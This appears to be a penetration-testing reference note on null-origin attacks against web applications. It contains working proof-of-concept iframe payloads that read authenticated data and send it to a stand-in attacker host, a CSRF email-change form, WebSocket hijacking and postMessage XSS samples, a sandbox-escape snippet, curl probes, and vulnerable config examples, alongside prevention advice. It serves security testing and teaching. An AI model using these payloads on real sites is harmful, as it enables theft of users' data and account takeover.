# Null Origin Attacks

#NullOrigin #SameOriginPolicy #CORS #CSRF #Sandbox #postMessage #WebAppAttacks #BurpSuite #cURL

## What is this?

An origin is the tuple `(scheme, host, port)` — `https://target.com:443`. Some documents don't get one. They get an **opaque origin**, which serialises in the `Origin` header as the literal four-character string `null`.

Null origin is a **bypass primitive, not a vulnerability**. Manufacturing one is trivial and always available to an attacker; it only becomes an attack when something on the server side *trusts* the string `null` — a CORS allowlist, a CSRF `Origin` check, a WebSocket handshake validator, or a `postMessage` handler. Every attack in this note is the same two moves: **manufacture a null origin, then present it to something that trusts it.**

The reason it works so often is that `null` reads like "no origin / absent / safe" to a developer writing an allowlist, when it actually means "any attacker who can open an iframe."

Pairs with [[CORS Misconfiguration]], [[CSRF Attacks]], [[WebSockets]], [[Cross-Site Scripting (XSS)]].

---

## Tools

| Tool | Purpose |
|---|---|
| [[Tools/Web/Burpsuite\|Burp Suite]] | Repeater origin swaps; Match & Replace to force `Origin: null` across a whole session |
| [[Tools/File Transfer/cURL\|curl]] | Send `Origin: null` directly — tests the server-side check with no browser involved |
| Browser DevTools | Confirm the origin the browser *actually* sent; the Network panel shows the real request headers, which is the only way to verify a sandbox produced `null` |
| `python3 -m http.server` | Host the sandboxed-iframe page on the attacker origin |

---

## What Produces a Null Origin

The section to get right — half of what people believe about this is wrong. Schemes that *look* exotic often inherit a perfectly normal origin.

| Source | Origin sent | Attacker-controllable? |
|---|---|---|
| `<iframe sandbox>` **without** `allow-same-origin` | `null` | **Yes — the primary technique** |
| `data:` URL document | `null` | **Yes** |
| CSP `sandbox` response-header directive | `null` | No — server does it to itself |
| `file://` document | `null` | Only in local/thick-client contexts |
| Cross-origin redirect during a CORS request | `null` | Sometimes |
| `srcdoc` iframe | **Inherits parent** unless also sandboxed | — |
| `blob:` URL | **Inherits the creating origin** | — |
| `javascript:` URL | **Inherits** | — |
| `about:blank` | **Inherits the opener** | — |

> [!warning] The bottom four are the common misconceptions. `blob:` and `srcdoc` are routinely assumed to be opaque and are not — a `blob:` document runs in the origin that created it, and `srcdoc` inherits the parent's origin. If you need `null` from either, you must *also* sandbox the frame.

### Sandboxed iframe — the primary technique

The `sandbox` attribute drops the frame into an opaque origin. Omitting `allow-same-origin` is what does it; adding that token hands the real origin back.

```html
<!-- Origin: null on every request this frame makes -->
<iframe sandbox="allow-scripts" src="https://attacker.com/payload.html"></iframe>
```

### `data:` URL

A `data:` document is always opaque. Combining it with `sandbox` is the standard PoC shape because it keeps the whole payload in one attribute with no second file to host.

```html
<iframe sandbox="allow-scripts" src="data:text/html,<script>fetch('https://target.com/api/me',{credentials:'include'})</script>"></iframe>
```

### CSP `sandbox` directive

A server can force *its own* response into an opaque origin with a response header. Worth knowing because it explains null origins you didn't create, and because it's a defense that can misfire.

```bash
# If the target sets this, its own page runs opaque — and its requests carry Origin: null
curl -sI "https://target.com/preview" | grep -i "content-security-policy"
# Content-Security-Policy: sandbox allow-scripts
```

### Cross-origin redirect

Per the Fetch spec, when a CORS request is redirected to a different origin the `Origin` header on the follow-up hop is downgraded to `null` (a "tainted" origin). An open redirect on the target can therefore manufacture a null origin against the target itself.

```bash
# Watch the Origin header change across the redirect chain
curl -sv -L "https://target.com/redirect?next=https://target.com/api/me" \
  -H "Origin: https://attacker.com" 2>&1 | grep -i "^> origin\|^< location"
```

### `file://`

Locally-opened HTML sends `Origin: null` in modern browsers. Rarely reachable remotely, but it's the reason `null` ends up in allowlists in the first place — see [[#Why `null` Ends Up in Allowlists]].

---

## The `sandbox` Attribute

You need to know the tokens, because each sink needs a different combination and over-granting silently destroys the null origin you were trying to create.

| Token | Grants | Effect on null origin |
|---|---|---|
| *(no tokens)* | Nothing — scripts, forms, and navigation all blocked | Opaque, but useless |
| `allow-scripts` | JS execution | **Keeps opaque** — the workhorse |
| `allow-forms` | Form submission | Keeps opaque |
| `allow-top-navigation` | `top.location = ...` | Keeps opaque — needed to exfiltrate by navigation |
| `allow-popups` | `window.open()` | Keeps opaque |
| `allow-modals` | `alert()` / `confirm()` | Keeps opaque |
| `allow-same-origin` | Restores the real origin | **Destroys the null origin — never include it** |

Minimum combination per sink:

| Sink | Tokens needed |
|---|---|
| CORS read + exfil via `fetch` to attacker server | `allow-scripts` |
| CORS read + exfil via navigation | `allow-scripts allow-top-navigation` |
| CSRF form submission | `allow-forms` (add `allow-scripts` to auto-submit) |
| WebSocket handshake | `allow-scripts` |
| `postMessage` | `allow-scripts` |

### The `allow-scripts allow-same-origin` escape

Granting both together is a well-known defensive footgun: the framed document is now same-origin with its parent *and* can run scripts, so it can reach up and delete its own `sandbox` attribute, then reload itself unsandboxed.

```javascript
// Inside a frame sandboxed with BOTH allow-scripts and allow-same-origin
frameElement.removeAttribute('sandbox');
window.location.reload();   // reloads with no sandbox at all
```

> [!tip] Report this whenever you find an app framing untrusted content with `sandbox="allow-scripts allow-same-origin"` — the sandbox is decorative. It's a finding in its own right, separate from any null-origin issue.

---

## Detection

One command per sink. Run these before building any PoC — all four are server-side checks that need no browser.

```bash
# Sink 1 — does CORS trust null?
curl -si "https://target.com/api/profile" -H "Origin: null" -b "session=<cookie>" \
  | grep -Ei "access-control-allow-(origin|credentials)"
# ACAO: null + ACAC: true → exploitable

# Sink 2 — does the CSRF origin check accept null?
curl -si -X POST "https://target.com/account/email" \
  -H "Origin: null" -b "session=<cookie>" -d "email=attacker@evil.com"
# 200 / action performed → exploitable

# Sink 3 — does the WebSocket handshake accept null?
curl -i -N -H "Connection: Upgrade" -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
  -H "Origin: null" -b "session=<cookie>" "https://target.com/ws"
# 101 Switching Protocols → exploitable

# Sink 4 — postMessage: grep the JS, there is no server-side test
curl -s "https://target.com/app.js" | grep -nE "addEventListener\(.message|\.origin\s*[=!]==?"
```

> [!note] A `curl` hit proves the *server* trusts `null`. It does not prove browser exploitability — you still need a sandboxed frame to make a real browser send it. Confirm with the PoC before reporting impact.

---

## Sink 1 — CORS Allowlist Trusts `null`

The read primitive. `ACAO: null` with `ACAC: true` lets an opaque-origin document read authenticated responses.

```html
<!-- Host on attacker.com. Frame is opaque → sends Origin: null → server allows it -->
<iframe sandbox="allow-scripts" src="data:text/html,
<script>
fetch('https://target.com/api/profile', { credentials: 'include' })
  .then(r => r.text())
  .then(d => fetch('https://attacker.com/steal?d=' + encodeURIComponent(d)));
</script>"></iframe>
```

Navigation-based exfil, for when outbound `fetch` from the sandbox is blocked by CSP:

```html
<iframe sandbox="allow-scripts allow-top-navigation" src="data:text/html,
<script>
var x = new XMLHttpRequest();
x.open('GET', 'https://target.com/api/profile', true);
x.withCredentials = true;
x.onload = function () { top.location = 'https://attacker.com/steal?d=' + encodeURIComponent(this.responseText); };
x.send();
</script>"></iframe>
```

Detection and the other CORS misconfiguration classes live in [[CORS Misconfiguration#3. Null Origin Trusted]] and [[CORS Misconfiguration#Null Origin (Sandboxed iframe)]].

---

## Sink 2 — CSRF `Origin` Allowlist

The write primitive. An `Origin`-header allowlist that includes `null` is bypassed by the same sandbox trick — and unlike the CORS case, you don't need `ACAC` or any read access, just for the request to be accepted.

```html
<!-- allow-forms to submit, allow-scripts to fire it without a click -->
<iframe sandbox="allow-forms allow-scripts" src="data:text/html,
<form action='https://target.com/account/email' method='POST'>
  <input name='email' value='attacker@evil.com'>
</form>
<script>document.forms[0].submit()</script>"></iframe>
```

> [!warning] `SameSite` still applies. The sandbox changes the *origin*, not the *site* — a `SameSite=Lax` or `Strict` session cookie will not ride along on this request. This sink lands only when the session cookie is `SameSite=None` or has no attribute and falls in the grace window. See [[CSRF Attacks#SameSite Cookie Bypasses]].

Full treatment of `Origin`/`Referer` validation bypasses in [[CSRF Attacks#`Origin: null`]].

---

## Sink 3 — WebSocket Handshake

The vault documents the `curl` probe for this but not the browser PoC. If the handshake validator accepts `Origin: null`, CSWSH works from a sandboxed frame — and WebSockets are bidirectional, so this is a read primitive as well as a write one.

```html
<iframe sandbox="allow-scripts" src="data:text/html,
<script>
var ws = new WebSocket('wss://target.com/ws');
ws.onopen    = function () { ws.send(JSON.stringify({action: 'getHistory'})); };
ws.onmessage = function (e) { fetch('https://attacker.com/log?d=' + btoa(e.data)); };
</script>"></iframe>
```

Note the handshake carries the victim's cookies subject to the same `SameSite` rules as any other cross-site request. Full CSWSH coverage, including the non-null origin variants, in [[WebSockets#1. Cross-Site WebSocket Hijacking (CSWSH)]].

---

## Sink 4 — `postMessage` Handlers

Absent from the rest of the vault. A receiver that validates `event.origin` can still be defeated if `null` is in its accepted set — and a sandboxed frame is exactly how an attacker becomes `"null"`.

Note `event.origin` is the **string** `"null"`, not the value `null`, so both of these are exploitable:

```javascript
// Vulnerable — "null" explicitly allowed
window.addEventListener('message', function (e) {
  if (e.origin === 'https://target.com' || e.origin === 'null') {
    document.getElementById('out').innerHTML = e.data;   // now attacker-controlled
  }
});

// Vulnerable — allowlist array containing the string
const ALLOWED = ['https://target.com', 'null'];
if (ALLOWED.includes(e.origin)) { handle(e.data); }
```

Sending from an opaque frame:

```html
<iframe sandbox="allow-scripts" src="data:text/html,
<script>
parent.postMessage('<img src=x onerror=alert(document.domain)>', '*');
</script>"></iframe>
```

```bash
# Hunt for it — flag any handler whose origin check mentions null, or has none at all
curl -s "https://target.com/app.js" \
  | grep -nE "addEventListener\(\s*['\"]message|origin\s*===?\s*['\"]null['\"]"
```

Sink and payload details for the resulting DOM XSS are in [[Cross-Site Scripting (XSS)#postMessage Exploitation]].

---

## Why `null` Ends Up in Allowlists

The root-cause section — this is what makes the finding reportable rather than theoretical, and what you put in the remediation paragraph.

| Cause | What happened |
|---|---|
| **Local file testing** | A dev opened the front end from `file://` during development, got `Origin: null`, and added `null` to make it work. It shipped. |
| **Hybrid / mobile webviews** | Cordova, Ionic, and older Electron shells historically sent `Origin: null`, so the API allowlisted it to support the mobile client. |
| **Sandboxed preview iframes** | The app's own preview/embed feature is sandboxed, so its requests arrive as `null` and the backend was widened to accept them. |
| **"null means no origin"** | The developer read `null` as *absent* and treated it as the safe, same-origin case — the exact inversion of what it means. |

Concrete misconfigurations to look for in source, if you have it:

```python
# Django — django-cors-headers
CORS_ALLOWED_ORIGINS = ["https://target.com", "null"]     # null is a literal string entry
```

```javascript
// Express — cors middleware
app.use(cors({ origin: ['https://target.com', 'null'], credentials: true }));

// Worse: reflecting whatever arrived, which includes null
app.use(cors({ origin: (o, cb) => cb(null, true), credentials: true }));
```

```java
// Spring
@CrossOrigin(origins = {"https://target.com", "null"}, allowCredentials = "true")
```

```nginx
# nginx — a regex that happens to match the literal string
if ($http_origin ~* "(target\.com|null)") { add_header Access-Control-Allow-Origin $http_origin; }
```

---

## Prevention

| Control | Detail |
|---|---|
| **Never allowlist `null`** | There is no legitimate production case. If a hybrid client needs access, give it a real origin or authenticate it with a header token instead of ambient cookies. |
| **Exact-match origins** | Compare against a fixed list of full origin strings. No regex, no `startsWith`/`endsWith`, no reflection of the received value. |
| **Reject absent as well as foreign** | An `Origin` check must fail closed when the header is missing, not skip validation. |
| **Never pair `allow-scripts` with `allow-same-origin`** | The framed page can strip its own sandbox. If content needs both, it doesn't need a sandbox — it needs a separate origin. |
| **Validate `event.origin` literally** | Compare to one expected origin string; never include `"null"`; never rely on `'*'` as `targetOrigin` when sending sensitive data. |
| **Set `Vary: Origin`** | Stops a cached `ACAO: null` response being served to everyone — see [[CORS Misconfiguration]]. |

---

## Related Topics

**Modules:**
- [[CORS Misconfiguration]] - The read sink; also covers the other origin-validation failure classes
- [[CSRF Attacks]] - The write sink; `SameSite` decides whether a null-origin CSRF actually lands
- [[WebSockets]] - CSWSH, the bidirectional sink
- [[Cross-Site Scripting (XSS)]] - `postMessage` sinks and the DOM XSS that follows
- [[Web Attacks]] - Adjacent origin/verb validation weaknesses

**Tools:**
- [[Tools/Web/Burpsuite\|Burp Suite]] - Match & Replace to force `Origin: null` session-wide
- [[Tools/File Transfer/cURL\|curl]] - Server-side origin checks without a browser

**External:**
- [PortSwigger - CORS with null origin](https://portswigger.net/web-security/cors)
- [MDN - Origin header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Origin)
- [MDN - iframe sandbox](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/iframe#sandbox)
- [HTML spec - opaque origins](https://html.spec.whatwg.org/multipage/browsers.html#concept-origin-opaque)

---

## Quick Reference

| Goal | Command / Payload |
|---|---|
| Test CORS trusts null | `curl -si https://target.com/api/me -H "Origin: null" -b "session=<cookie>" \| grep -i access-control` |
| Test CSRF check accepts null | `curl -si -X POST https://target.com/account/email -H "Origin: null" -b "session=<cookie>" -d "email=a@evil.com"` |
| Test WS handshake accepts null | `curl -i -N -H "Connection: Upgrade" -H "Upgrade: websocket" -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" -H "Origin: null" https://target.com/ws` |
| Minimal null-origin frame | `<iframe sandbox="allow-scripts" src="data:text/html,<script>/*payload*/</script>"></iframe>` |
| Null-origin CORS exfil | `fetch('https://target.com/api/me',{credentials:'include'}).then(r=>r.text()).then(d=>fetch('https://attacker.com/?d='+encodeURIComponent(d)))` |
| Null-origin CSRF | `<iframe sandbox="allow-forms allow-scripts" src="data:text/html,<form action=...>...<script>document.forms[0].submit()</script>">` |
| Find postMessage handlers | `curl -s https://target.com/app.js \| grep -nE "addEventListener\(\s*['\"]message"` |
| Escape a broken sandbox | `frameElement.removeAttribute('sandbox'); location.reload();` (needs `allow-scripts allow-same-origin`) |
| Force null origin in Burp | Proxy → Options → Match & Replace → Request header → `^Origin:.*$` → `Origin: null` |

---

*Created: 2026-08-23*
*Updated: 2026-08-23*
*Model: claude-opus-5*
